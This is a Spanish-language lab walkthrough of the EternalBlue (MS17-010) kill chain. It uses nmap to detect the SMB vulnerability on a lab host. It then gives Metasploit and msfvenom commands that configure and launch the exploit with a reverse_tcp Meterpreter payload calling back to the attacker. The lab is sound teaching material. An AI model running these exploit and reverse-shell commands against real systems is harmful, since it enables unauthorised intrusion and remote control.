# Kill Chain 3: EternalBlue / MS17-010

## Lab: Detección y Explotación

### Paso 0: Inspeccionar el módulo antes de explotar

Previamente se ispeccionó la herramienta con la que vamos a trabajar:

    1    msfconsole -q
    2    use exploit/windows/smb/ms17_010_eternalblue
    3    info


Se inicia con *msfconsole -q* que apertura la consola de Metasploit, facilitando el acceso al entorno:

![Importación](/assets/imag4/fig00.png)

Seguido, a traves de *use exploit/windows/smb/ms17_010_eternalblue*  se carga el módulo encargado de explotar la vulnerabilidad MS17-010:

![Importación](/assets/imag4/fig01.png)

mediante el comando *info* se consulta la documentación técnica del módulo, incluyendo su descripción, las vulnerabilidades asociadas, los sistemas compatibles, las opciones de configuración y los payloads soportados. 

![Importación](/assets/imag4/fig02.png)
![Importación](/assets/imag4/fig03.png)
![Importación](/assets/imag4/fig04.png)

Esta revisión previa permite comprender el funcionamiento del exploit y verificar su aplicabilidad antes de iniciar la fase de explotación.

ademas, se utilizó el comando 

        1 locate ms17_010_eternalblue.rb

para poder saber dónde está ubicado el archivo (2) Ruby (código de explotación de esta vulnerabilidad) dentro de Kali Linux.

Output:

![Importación](/assets/imag4/fig05.png)

Ver cómo Metasploit genera el payload con los parámetros que se configura:

Cuando ejecuta:

           
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f hex 2>/dev/null | head -c 160 

Se genera un payload utilizando _msfvenom_ con el propósito de observar cómo Metasploit construye dinámicamente el _shellcode_.

Es necesario cambiar la IP del RHOST de nuestra victima

![Importación](/assets/imag4/fig06.png)

Se genera los primeros bytes del shellcode, código que será utilizado durante la explotación. El shellcode contiene informacion configurada del atacante (LHOST y LPORT) y será enviado al sistema víctima mediante el proceso de explotación de SMB.

Si el exploit tiene éxito, el sistema víctima ejecutará ese código y establecerá una conexión reversa hacia la máquina atacante.

### Paso 1: Confirmar la vulnerabilidad

Ya revisado el módulo de explotación, se procedió a verificar si la máquina objetivo presentaba la vulnerabilidad MS17-010.


         sudo nmap --script vuln -p 445 10.0.2.15

Para ello, se utilizó Nmap con el script smb-vuln-ms17-010, perteneciente a la categoría de scripts de detección de vulnerabilidades (NSE), enfocando el análisis sobre el puerto 445/TCP, correspondiente al servicio SMB.

Output:

![Importación](/assets/imag4/fig07.png)

Interpretación de la salida:

|Salida | Interpretación | 
| --- | --- |
| smb-vuln-ms17-010| script para detectar la vulnerabilidad MS17-010 | 
| VULNERABLE| Hay señales de vulnerabilidad | 
| Remote Code Execution vulnerability| permite ejecución remota |
| State: VULNERABLE | Se confirma que es suceptible  |

### Paso 2: Explotar con Metasploit

Se lleva a cabo la explotación de la vulnerabilidad para obtener acceso al sistema.

Se inicia Metasploit y selecciona el Exploit: 

        msfconsole -q
        use exploit/windows/smb/ms17_010_eternalblue

Se muestran las opciones:

![Importación](/assets/imag4/fig08.png)

Se configura la máquina víctima y la máquina atacante:

        set RHOSTS 10.0.2.15        IP del equipo que quiero atacar
        set LHOST 10.0.2.93         IP donde Metasploit esperará la conexión que enviará la víctima.
        set payload windows/x64/meterpreter/reverse_tcp      Se indica el payload
        run
